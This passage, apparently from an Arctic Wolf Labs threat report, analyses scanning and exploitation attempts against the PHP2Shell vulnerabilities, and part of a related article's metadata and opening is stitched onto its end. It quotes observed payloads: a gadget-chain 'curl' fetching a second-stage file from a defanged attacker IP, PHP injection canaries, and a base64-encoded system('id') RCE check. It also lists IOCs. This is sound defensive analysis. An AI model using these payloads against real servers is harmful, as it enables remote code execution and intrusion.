+The serialized object contained a Monolog gadget chain configured to execute:
+
+curl -s hxxp://45.115.26[.]26:8000/cCmono
+
+The serialized object ultimately attempted to execute a command that would download a second-stage payload named cCmono from a remote server. Arctic Wolf Labs was unable to retrieve the referenced file during analysis and could not independently verify the payload that may have been delivered.
+
+Unlike the command-execution validation payloads discussed previously, this request does not appear to target the memory-corruption mechanisms underlying PHP2Shell. Instead, it attempts to leverage PHP’s session upload-progress feature to place attacker-controlled content into session storage, potentially for use in a subsequent local file inclusion or unsafe deserialization chain.
+
+Successful exploitation would require additional application-specific conditions beyond the PHP vulnerabilities themselves, such as the ability to retrieve and deserialize attacker-controlled session data and the presence of compatible Monolog classes. The request demonstrates malicious intent but does not independently establish exploitation of CVE-2026-109618 or CVE-2026-109619.
+
+Inert Canaries and Execution Markers
+
+Several scanners used PHP canaries to test whether attacker-controlled content reached session data or an executable context.
+
+The least intrusive sample contained an explicitly inert PHP block:
+
+<?php /* php2shell-scan inert canary */ ?>
+
+Because the block contains only a comment, it does not execute a command, collect system information, or produce output. It appears designed to test whether PHP syntax could be introduced into upload-progress data without attempting to demonstrate code execution.
+
+Other scanners used output-producing canaries. A Nuclei-based request embedded a unique marker in uploaded filename metadata:
+
+<?php echo ‘NUCLEIve97RH0fzh’; ?>
+
+If a subsequent file-inclusion request caused PHP to evaluate the poisoned session data, the marker would appear in the server response and allow the scanner to correlate the result with the original request.
+
+Another scanner placed two fixed markers in both the upload-progress value and filename:
+
+<?php echo ‘P2SFNAME’; echo ‘P2SVALUE’; ?>
+
+The associated session identifier ended in .php, suggesting that the scanner may also have been testing whether the session identifier influenced a filename that could later be reached or evaluated by the web server. The .php suffix reflects the scanner’s apparent assumption, however, and does not establish that PHP created a web-accessible file with that name.
+
+These output canaries are non-destructive, but they go beyond inert injection checks. If returned by the server, they would provide evidence that attacker-controlled PHP reached an executable context.
+
+Validating Operating-System Command Execution
+
+The most intrusive scanning activity attempted to validate execution beyond the PHP interpreter. Multiple requests embedded PHP that decoded and ran the Unix id command:
+
+<?php echo ‘RCE_noyzzg0YVLBU’; system(base64_decode(‘aWQ=’)); echo ‘RCE_noyzzg0YVLBU’; ?>
+
+The Base64 value aWQ= decodes to id. If successful, the payload would return the user and group identity of the affected PHP worker process.
+
+The unique RCE_ strings bracket the expected command output, allowing an automated scanner to locate it within an HTTP response and associate the result with a specific request. Arctic Wolf Labs observed multiple markers, including repeated use of the same value, which may indicate retries, injection into multiple request fields, or repeated testing of the same target.
+
+These payloads represent active RCE validation rather than passive scanning. However, the presence of the payload in a request does not independently establish that PHP evaluated it or that the operating-system command executed successfully. Confirmation would require corresponding response content, process telemetry, or other server-side evidence.
+
+Vulnerability Overview
+
+The vulnerabilities arise from separate weaknesses in PHP’s handling of request memory and abnormal execution states:
+
+CVE-2026-109618 can cause memory corruption when an out-of-memory condition interrupts PHP while internal request data is only partially initialized.
+
+CVE-2026-109619 can allow request-owned global state to remain accessible after its backing memory has been freed, creating a stale-state condition that a later request may reuse.
+
+Vulnerability
+
+Description
+
+Impact
+
+Severity
+
+CVE-2026-109618
+
+Memory corruption during out-of-memory handling
+
+Unauthenticated remote code execution
+
+CVSS v4.0 9.2
+
+CVE-2026-109619
+
+Reuse of stale request-owned global state after memory is freed
+
+Unauthenticated remote code execution, with possible memory disclosure
+
+CVSS v4.0 9.2
+
+Both vulnerabilities affect PHP’s internal request-processing lifecycle. As a result, exposure does not necessarily depend on a vulnerability in the application running on top of PHP. Any reachable PHP script may expose the underlying request-processing path under the required conditions.
+
+Affected Deployment Models
+
+The PHP project identifies the following web-serving configurations as at risk:
+
+Apache with mod_php
+
+PHP-FPM
+
+php-cgi
+
+FrankenPHP
+
+LiteSpeed
+
+Products and appliances that embed or bundle PHP
+
+Apache mod_php presents the most clearly demonstrated risk because exploitation can reportedly occur through one unauthenticated request before the target application receives control. Other deployment models remain affected, but exploit requirements and worker-state behavior may differ.
+
+Public PoC material is available, and multiple security organizations have independently reproduced at least one exploitation path. Public reporting from security vendors also indicates that exploit attempts began around the time of disclosure, although the scale and success of that activity remain incompletely established.
+
+Organizations should immediately update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35. Systems running unsupported PHP versions may require an operating-system or long-term-support vendor backport, an appropriate upstream source backport, or migration to a supported branch.
+
+Conclusion
+
+PHP2Shell attracted significant attention because of its severity, PHP’s widespread use, and its discovery through AI-assisted security research. According to OpenAI, researchers participating in its Patch the Planet initiative used frontier AI models, alongside expert human review, to help identify and validate the vulnerabilities.
+
+Early exploitation has been more limited than the initial attention suggested. Arctic Wolf telemetry and public reporting show widespread scanning, exploit validation, and isolated attempts to deliver second-stage payloads, but comparatively little evidence of reliable exploitation at scale.
+
+The activity observed following disclosure also highlights a broader challenge for defenders: publicly released proof-of-concept code is often modified, repackaged, and rapidly redistributed. Arctic Wolf Labs observed PHP2Shell-themed requests that appeared to reuse older session-poisoning and deserialization tradecraft rather than the memory-corruption mechanisms underlying CVE-2026-109618 and CVE-2026-109619. As a result, defenders should avoid assuming that every PHP2Shell-themed request represents successful exploitation or even an attempt to exercise the newly disclosed vulnerabilities. Instead, organizations should focus on identifying evidence of the specific exploitation conditions required by the vulnerabilities themselves.
+
+Because PHP2Shell was publicly disclosed only on October 21, 2026, the exploitation landscape may change quickly. Organizations should upgrade affected PHP installations, restart the relevant workers, and continue monitoring for command execution and second-stage payload delivery.
+
+How Arctic Wolf Labs Turns Telemetry Into Outcomes
+
+Arctic Wolf Labs is our threat intelligence and research team. Global security operations center (SOC) telemetry visibility drives a shared defense, while active network monitoring gives Labs an early warning system across our global customer base.
+
+Using telemetry from across the Arctic Wolf customer community, researchers identify spikes in scanning activity, analyze exploitation attempts, and uncover attacker payloads associated with PHP2Shell. We use those findings to develop and fine-tune detections to respond to malicious activity faster. This helps customers detect PHP2Shell activity they may have not observed yet in their unique environment.
+
+Labs researchers also replicate attacker techniques against PHP2Shell vulnerabilities in controlled environments. Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise (IOA/IOC), to develop new detections, threat hunt queries, and inform customer remediation guidance. As threat behavior evolves, we continuously apply the latest intelligence across customer environments.
+
+Indicators of Compromise (IOCs)
+
+e2529d4afa39ae4db2eb05d5176317c906289abf09660c75bdeec43e54c55aa3
+
+0c5486f06620e26e316f4b33f318b0d646d5e1133789331aa2fed012360d1486
+
+hxxp://92.118.112[.]100/nfs-setup
+
+hxxp://92.118.112[.]100/mountpoint
+
+hxxp://45.115.26[.]26:8000/cCmono
+
+92.118.112[.]100
+
+45.198.224[.]169
+
+5.175.189[.]76
+
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+Additional Arctic Wolf Resources:
+
+Read the related blog: Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure
+
+Sign up for Arctic Wolf’s free Threat Intelligence newsletter: ThreatPulse Community Edition
+
+Arctic Wolf Tech Den
+
+Arctic Wolf Blog
+
+Legal Disclaimers:
+
+Attribution reflects Arctic Wolf Labs’ assessment as of the report period and may evolve with new evidence. References to threat actor identity, nexus, and intent are analytical judgments, not statements of legal fact. This alert is provided for informational purposes only and does not constitute a guarantee of detection or prevention. Defensive effectiveness varies by environment, configuration, and available telemetry."
+5dc15e197e0d,2b62329cc6f4,2026-10-21 21:36 UTC,Vulnerabilities & Patching,Arctic Wolf,Arctic Wolf Blog,Vulnerability Management; Server & Workload Protection; Threat Intelligence,Article,"Arctic Wolf Labs: Finding, Prioritizing, and Patching PHP2Shell Exposure",https://arcticwolf.com/resources/blog/arctic-wolf-labs-finding-prioritizing-and-patching-php2shell-exposure/,"On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race...","On Tuesday, October 20, threat actors gained advance visibility into two critical PHP vulnerabilities after details leaked ahead of the planned disclosure, accelerating the race between defenders and attackers. The flaws are tracked as Common Vulnerabilities and Exposures (CVE) identifiers CVE-2026-109618 and CVE-2026-109619. Together they’re known as PHP2Shell. Both carry a 9.2 rating on the Common Vulnerability Scoring System (CVSS) version 4.0 scale. For both vulnerabilities, Arctic Wolf’s Aurora® Agentic SOC helps organizations rapidly identify affected assets, correlate exploitation signals across the environment, and accelerate investigation and response before attackers can establish persistence.
 
 An unauthenticated attacker can use either flaw to run code on a vulnerable server. On Wednesday, October 21, the PHP project released patched versions. PHP2Shell shows how AI is changing the threat landscape. Attackers can now find and weaponize old flaws in widely used technology faster than ever before. Arctic Wolf recommends treating every PHP installation that serves web requests as at-risk presently. Internet-facing Linux web servers without endpoint monitoring carry the highest risk of quiet compromise.
 
